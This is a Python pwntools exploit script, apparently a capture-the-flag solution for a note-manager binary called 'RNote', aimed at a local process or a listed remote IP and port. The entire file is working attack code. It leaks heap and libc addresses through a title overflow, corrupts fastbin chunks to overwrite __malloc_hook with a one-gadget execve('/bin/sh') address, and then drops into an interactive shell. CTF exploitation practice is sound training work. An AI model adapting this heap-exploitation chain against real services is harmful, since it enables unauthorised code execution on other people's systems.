from pwn import *
import time, sys


# local process envirnoment
LOCAL = True
elf_name = "./RNote"

#retmote args
remote_host = "115.28.185.220"
remote_port = 22222
context.clear(arch="amd64")
elf = ELF(elf_name)

if LOCAL:
    smlbin_area_off = 0x3C3B78
    execv_binsh_off = 0xF0567
    malloc_hook_off = 0x3C3B10
    #context.log_level = "debug"
    mine_env = os.environ
    mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so"
    io = process(elf_name, env=mine_env)
else:
    printf_off = 0x4CDD0
    system_off = 0x3FE70
    io = remote(remote_host, remote_port)

def dlySend(sdstr):
    io.send(sdstr)
    time.sleep(0.05)

def mmenu(opt):
    io.recvuntil("Your choice: ")
    io.sendline(str(opt))

def add_note(size, mtitle, mcontent):
    mmenu(1)
    io.recvuntil("Please input the note size: ")
    io.sendline(str(size))
    io.recvuntil("Please input the title: ")
    dlySend(mtitle)
    io.recvuntil("Please input the content: ")
    dlySend(mcontent)

def delete_note(mindex):
    mmenu(2)
    io.recvuntil("Which Note do you want to delete: ")
    io.sendline(str(mindex))

def show_note(mindex):
    mmenu(3)
    io.recvuntil("Which Note do you want to show: ")
    io.sendline(str(mindex))

def exit_rnote():
    mmenu(4)

def s_leak():
    for i in range(4):
        add_note(0xf8, chr(0x48+i)*0x9+'\n', chr(0x61+i)*0xf0)
    pause()
    delete_note(2)
    delete_note(3)
    add_note(0xf8, 'x'*0x10+chr(0x11), 'l'*0x08)
    show_note(2)
    io.recvuntil("note title: ")
    io.recv(0x10)
    data = (io.recvuntil('\n')[:-1]).ljust(8, chr(0))
    heap_addr = u64(data) & 0xFFFFFFFFFFFFFF00
    log.info("heap addr "+hex(heap_addr))
    io.recvuntil("note content: ")
    io.recv(0x7)
    libc_base_addr = u64(io.recv(8)) - smlbin_area_off
    log.info("libc addr "+hex(libc_base_addr))
    io.recvuntil('\n')
    add_note(0xf8, 'x'*0x9+'\n', 'o'*0x08)
    return libc_base_addr

def s_exp():
    libc_base_addr = s_leak()
    payload = 'f'*0x40
    payload += p64(0) + p64(0x91)
    add_note(0x60, 'x'*0x10+chr(0x60), payload)  # 4
    add_note(0x60, '5'*0x9+'\n', 'e'*0x10)  # 5
    add_note(0x60, '5'*0x9+'\n', 'e'*0x10)  # 6
    add_note(0x60, '7'*0x9+'\n', 'e'*0x10)  # 7
    add_note(0x60, '8'*0x9+'\n', 'e'*0x10)  # 8
    pause()
    delete_note(4)
    delete_note(6)
    delete_note(5)
    payload = 'a'*0x10
    payload += p64(0) + p64(0x71)
    payload += p64(libc_base_addr+malloc_hook_off-0x03-0x20)
    add_note(0x80, 'o'*0x9+'\n', payload)
    payload = chr(0)*3
    payload += p64(0)*2
    payload += p64(libc_base_addr+execv_binsh_off)
    add_note(0x60, '8'*0x9+'\n', payload)
    add_note(0x60, '8'*0x9+'\n', payload)
    mmenu(1)
    io.recvuntil("Please input the note size: ")
    io.sendline(str(0x60))
    io.interactive()

if __name__ == "__main__":
    s_exp()
    pause()
